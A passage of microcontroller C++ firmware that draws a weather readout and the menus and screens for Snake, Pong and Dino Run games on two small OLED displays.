  String desc = wxDesc; desc[0] = toupper(desc[0]); if (desc.length() > 21) desc = desc.substring(0,21); displayLarge.setCursor(4, 46); displayLarge.print(desc);
  displayLarge.setCursor(76, 14); displayLarge.printf("Hum:%d%%", wxHumidity); displayLarge.setCursor(76, 26); displayLarge.printf("Wind:%.1f", wxWind); displayLarge.setCursor(76, 34); displayLarge.print("m/s"); displayLarge.setCursor(76, 46); displayLarge.printf("Feels:%dC", wxFeels);
  struct tm ti; char updStr[16]; if (getLocalTime(&ti)) strftime(updStr,sizeof(updStr),"%H:%M",&ti); else strcpy(updStr,"--:--"); displayLarge.setCursor(76, 57); displayLarge.print("Upd:"); displayLarge.print(updStr);
}
void drawGameSmall() {
  displaySmall.setTextSize(1); displaySmall.setCursor(0,0);
  if(gameSub==GAME_MENU_SEL){ displaySmall.print("-- GAMES --"); displaySmall.setCursor(0,16); displaySmall.print("Controls:"); displaySmall.setCursor(0,28); displaySmall.print("A/B : Navigate"); displaySmall.setCursor(0,40); displaySmall.print("D   : Select"); displaySmall.setCursor(0,52); displaySmall.print("#   : Back to menu"); }
  else if(gameSub==GAME_SNAKE){ displaySmall.print("-- SNAKE --"); displaySmall.setTextSize(2); displaySmall.setCursor(0,16); displaySmall.printf("Sc:%d", snkScore); displaySmall.setTextSize(1); if(snkOver){ displaySmall.setCursor(0,42); displaySmall.print("GAME OVER!"); displaySmall.setCursor(0,52); displaySmall.print("D:Retry #:Menu"); } else { displaySmall.setCursor(0,42); displaySmall.print("2/4/6/8:Move"); displaySmall.setCursor(0,52); displaySmall.print("#:Back to menu"); } }
  else if(gameSub==GAME_PONG){ displaySmall.print("-- PONG --"); displaySmall.setTextSize(2); displaySmall.setCursor(0,16); displaySmall.printf("P:%d AI:%d", pPlayerScore, pAiScore); displaySmall.setTextSize(1); if(pongOver){ displaySmall.setCursor(0,42); displaySmall.print(pPlayerScore>=7?"YOU WIN!":"AI WINS!"); displaySmall.setCursor(0,52); displaySmall.print("D:Retry #:Menu"); } else { displaySmall.setCursor(0,42); displaySmall.print("A/B: Move paddle"); displaySmall.setCursor(0,52); displaySmall.print("#:Back to menu"); } }
  else if(gameSub==GAME_DINO) drawDinoSmall();
}
void drawGameLarge() {
  displayLarge.setTextSize(1);
  if(gameSub==GAME_MENU_SEL){ displayLarge.setCursor(0,0); displayLarge.print("--- GAMES ---"); displayLarge.drawLine(0,10,128,10,SH110X_WHITE); displayLarge.setCursor(0,16); if(gameMenuSel==0) displayLarge.print("> "); else displayLarge.print("  "); displayLarge.print("1. Snake"); displayLarge.setCursor(0,30); if(gameMenuSel==1) displayLarge.print("> "); else displayLarge.print("  "); displayLarge.print("2. Pong"); displayLarge.setCursor(0,44); if(gameMenuSel==2) displayLarge.print("> "); else displayLarge.print("  "); displayLarge.print("3. Dino Run"); return; }
  if(gameSub==GAME_SNAKE){ if(snkOver){ displayLarge.setCursor(30,10); displayLarge.setTextSize(2); displayLarge.print("GAME"); displayLarge.setCursor(30,30); displayLarge.print("OVER"); displayLarge.setTextSize(1); displayLarge.setCursor(20,54); displayLarge.printf("Score: %d", snkScore); return; } displayLarge.fillRect(foodX*CELL, foodY*CELL, CELL-1, CELL-1, SH110X_WHITE); for(int i=0;i<snkLen;i++){ if(i==0) displayLarge.fillRect(snk[i].x*CELL, snk[i].y*CELL, CELL-1, CELL-1, SH110X_WHITE); else displayLarge.drawRect(snk[i].x*CELL, snk[i].y*CELL, CELL-1, CELL-1, SH110X_WHITE); } return; }
  if(gameSub==GAME_PONG){ if(pongOver){ displayLarge.setTextSize(2); displayLarge.setCursor(20,16); displayLarge.print(pPlayerScore>=7?"YOU WIN!":"AI WINS!"); displayLarge.setTextSize(1); displayLarge.setCursor(10,48); displayLarge.printf("P:%d  AI:%d", pPlayerScore, pAiScore); return; } displayLarge.setCursor(50,0); displayLarge.printf("%d | %d", pPlayerScore, pAiScore); for(int y=10;y<64;y+=6) displayLarge.drawPixel(64,y,SH110X_WHITE); displayLarge.fillRect(2, pPlayerY, PAD_W, PAD_H, SH110X_WHITE); displayLarge.fillRect(128-PAD_W-2, pAiY, PAD_W, PAD_H, SH110X_WHITE); displayLarge.fillRect((int)pBallX-1, (int)pBallY-1, 3, 3, SH110X_WHITE); return; }
  if(gameSub==GAME_DINO){ if(dinoOver){ displayLarge.setTextSize(2); displayLarge.setCursor(16,12); displayLarge.print("GAME OVER"); displayLarge.setTextSize(1); displayLarge.setCursor(22,38); displayLarge.printf("Score: %d", dinoScore); displayLarge.setCursor(10,52); displayLarge.print("D:Retry  #:Games Menu"); return; } drawDinoLarge(); return; }
}